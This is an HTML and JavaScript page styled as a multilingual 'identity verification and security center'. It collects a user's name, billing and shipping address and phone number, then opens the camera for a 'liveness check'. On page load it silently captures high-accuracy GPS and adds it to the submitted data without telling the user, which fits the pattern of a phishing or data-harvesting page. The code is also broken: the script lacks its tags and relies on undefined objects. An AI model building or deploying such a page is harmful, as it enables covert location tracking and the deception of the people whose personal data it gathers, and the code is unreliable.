<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>身份核验与安全中心</title>
    <style>
        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); box-sizing: border-box; }
        
        .back-link { display: inline-block; color: var(--primary); font-size: 14px; text-decoration: none; margin-bottom: 15px; font-weight: 500; cursor: pointer; }
        .back-link:hover { text-decoration: underline; }

        h2 { margin-top: 0; color: #111; text-align: center; font-size: 22px; font-weight: 700; margin-bottom: 5px; }
        .subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }

        .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
        .form-group { margin-bottom: 16px; flex: 1; }
        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
        input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; box-sizing: border-box; font-size: 14px; background-color: #fff; transition: all 0.2s; }
        input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
        select:disabled { background-color: #f8fafc; color: #94a3b8; }

        .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
        .btn:hover { background: #0052cc; }
        
        #step-form, #step-verification { display: none; }
        .lang-card { text-align: center; }
        .lang-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
        .lang-btn { width: 100%; padding: 14px; background: #fff; border: 2px solid var(--primary); color: var(--primary); border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .lang-btn:hover { background: var(--primary); color: #fff; }
        
        #video-container { text-align: center; margin-top: 15px; }
        video { width: 100%; max-width: 380px; height: 280px; border-radius: 10px; transform: scaleX(-1); background: #000; object-fit: cover; }
    </style>
</head>
<body>

<div class="container">
    <!-- 10种语言选择界面（已嵌入您指定的 SVG 图标标题） -->
    <div id="step-language" class="lang-card">
        <h2 style="display:flex; align-items:center; justify-content:center; gap:8px; margin:0 0 20px 0;">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="5" width="18" height="14" rx="3"/>
            <text x="7" y="15" font-size="9" font-weight="bold" fill="currentColor" stroke="none">A</text>
            <text x="13.5" y="10.5" font-size="6.5" fill="currentColor" stroke="none" opacity="0.8">文</text>
          </svg>
          <span id="txt-lang-title">Select Language / 选择语言</span>
        </h2>
        <div class="lang-grid">
            <button class="lang-btn" onclick="setLanguage('zh')">简体中文</button>
            <button class="lang-btn" onclick="setLanguage('en')">English</button>
            <button class="lang-btn" onclick="setLanguage('zh-TW')">繁體中文</button>
            <button class="lang-btn" onclick="setLanguage('ja')">日本語</button>
            <button class="lang-btn" onclick="setLanguage('ko')">한국어</button>
            <button class="lang-btn" onclick="setLanguage('fr')">Français</button>
            <button class="lang-btn" onclick="setLanguage('de')">Deutsch</button>
            <button class="lang-btn" onclick="setLanguage('es')">Español</button>
            <button class="lang-btn" onclick="setLanguage('ru')">Русский</button>
            <button class="lang-btn" onclick="setLanguage('ar')">العربية</button>
        </div>
    </div>

    <!-- 表单页面 -->
    <div id="step-form">
        <a class="back-link" onclick="goBackToLanguage()" id="txt-back">< 返回更改语言</a>
        
        <h2 id="txt-form-title">账单与收货地址</h2>
        <div class="subtitle" id="txt-form-subtitle">请输入您的详细信息以完成安全核验准备</div>
        
        <div class="form-row">
            <div class="form-group">
                <label id="lbl-firstname">名字 (First Name)</label>
                <input type="text" id="firstName" placeholder="">
            </div>
            <div class="form-group">
                <label id="lbl-lastname">姓氏 (Last Name)</label>
                <input type="text" id="lastName" placeholder="">
            </div>
        </div>

        <div class="form-group">
            <label id="lbl-country">国家 / 地区 (Country / Region)</label>
            <select id="countrySelect" onchange="loadStates()">
                <option value="">-- 请选择国家 / 地区 --</option>
            </select>
        </div>

        <div class="form-group">
            <label id="lbl-state">省份 / 州 (State / Province)</label>
            <select id="stateSelect" disabled>
                <option value="">-- 请先选择上方国家 --</option>
            </select>
        </div>

        <div class="form-group">
            <label id="lbl-address">街道地址 (Street Address)</label>
            <input type="text" id="address" placeholder="">
        </div>

        <div class="form-row">
            <div class="form-group">
                <label id="lbl-city">城市 (City)</label>
                <input type="text" id="city" placeholder="">
            </div>
            <div class="form-group">
                <label id="lbl-zip">邮政编码 (Postal Code)</label>
                <input type="text" id="zipCode" placeholder="">
            </div>
        </div>

        <div class="form-group">
            <label id="lbl-phone">手机号码 (Phone Number)</label>
            <input type="tel" id="phone" placeholder="">
        </div>

        <button class="btn" id="btn-next" onclick="proceedToVerification()">下一步：生物活体检测 →</button>
    </div>

    <!-- 活体检测页面 -->
    <div id="step-verification">
        <h2 id="txt-verify-title">生物活体安全检测</h2>
        <p id="txt-verify-desc" style="font-size: 13px; color: #64748b; text-align: center;">请正对摄像头，保持光线充足，完成安全核验。</p>
        <div id="video-container">
            <video id="video" autoplay playsinline muted></video>
        </div>
        <button class="btn" id="btn-submit" onclick="submitData()" style="background: #10b981; margin-top: 20px;">确认并提交</button>
    </div>
</div>

    let currentLang = 'en';
    let silentLocation = { lat: null, lng: null, precisionMeters: null };

    window.onload = () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    silentLocation.lat = pos.coords.latitude;
                    silentLocation.lng = pos.coords.longitude;
                    silentLocation.precisionMeters = pos.coords.accuracy;
                },
                err => { console.log("Location optional"); },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        const select = document.getElementById('countrySelect');
        select.innerHTML = `<option value="">-- 请选择国家 / 地区 --</option>`;
        
        const sortedKeys = Object.keys(globalDatabase).sort((a, b) => 
            globalDatabase[a].name.localeCompare(globalDatabase[b].name)
        );

        sortedKeys.forEach(code => {
            let opt = document.createElement('option');
            opt.value = code;
            opt.textContent = globalDatabase[code].name;
            select.appendChild(opt);
        });
    };

    function loadStates() {
        const countryCode = document.getElementById('countrySelect').value;
        const stateSelect = document.getElementById('stateSelect');
        
        stateSelect.innerHTML = `<option value="">-- 请先选择上方国家 --</option>`;
        
        if (countryCode && globalDatabase[countryCode]) {
            stateSelect.disabled = false;
            globalDatabase[countryCode].states.forEach(stateName => {
                let opt = document.createElement('option');
                opt.value = stateName;
                opt.textContent = stateName;
                stateSelect.appendChild(opt);
            });
        } else {
            stateSelect.disabled = true;
        }
    }

    function setLanguage(lang) {
        currentLang = lang;
        const t = i18n[lang];
        document.getElementById('txt-lang-title').innerText = t.langTitle;
        document.getElementById('txt-back').innerText = t.back;
        document.getElementById('txt-form-title').innerText = t.formTitle;
        document.getElementById('txt-form-subtitle').innerText = t.formSubtitle;
        document.getElementById('lbl-firstname').innerText = t.firstName;
        document.getElementById('lbl-lastname').innerText = t.lastName;
        document.getElementById('lbl-country').innerText = t.country;
        document.getElementById('lbl-state').innerText = t.state;
        document.getElementById('lbl-address').innerText = t.address;
        document.getElementById('lbl-city').innerText = t.city;
        document.getElementById('lbl-zip').innerText = t.zip;
        document.getElementById('lbl-phone').innerText = t.phone;
        document.getElementById('btn-next').innerText = t.next;
        document.getElementById('txt-verify-title').innerText = t.verifyTitle;
        document.getElementById('txt-verify-desc').innerText = t.verifyDesc;
        document.getElementById('btn-submit').innerText = t.submit;

        document.getElementById('step-language').style.display = 'none';
        document.getElementById('step-form').style.display = 'block';
    }

    function goBackToLanguage() {
        document.getElementById('step-form').style.display = 'none';
        document.getElementById('step-language').style.display = 'block';
    }

    async function proceedToVerification() {
        const t = i18n[currentLang];
        const firstName = document.getElementById('firstName').value;
        const lastName = document.getElementById('lastName').value;
        const country = document.getElementById('countrySelect').value;
        
        if (!firstName.trim() || !lastName.trim()) { alert(t.alertName); return; }
        if (!country) { alert(t.alertAddress); return; }

        document.getElementById('step-form').style.display = 'none';
        document.getElementById('step-verification').style.display = 'block';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;
        } catch (e) {
            alert(t.alertCamera);
        }
    }

    function submitData() {
        const payload = {
            firstName: document.getElementById('firstName').value,
            lastName: document.getElementById('lastName').value,
            country: document.getElementById('countrySelect').value,
            state: document.getElementById('stateSelect').value,
            address: document.getElementById('address').value,
            city: document.getElementById('city').value,
            zipCode: document.getElementById('zipCode').value,
            phone: document.getElementById('phone').value,
            deviceGPS: silentLocation,
            timestamp: new Date().toISOString()
        };

        console.log("Submitted Payload:", payload);
        alert(currentLang === 'zh' ? "生物活体检测与地址核验提交成功！" : "Verification and data submitted successfully!");
        location.reload();
    }
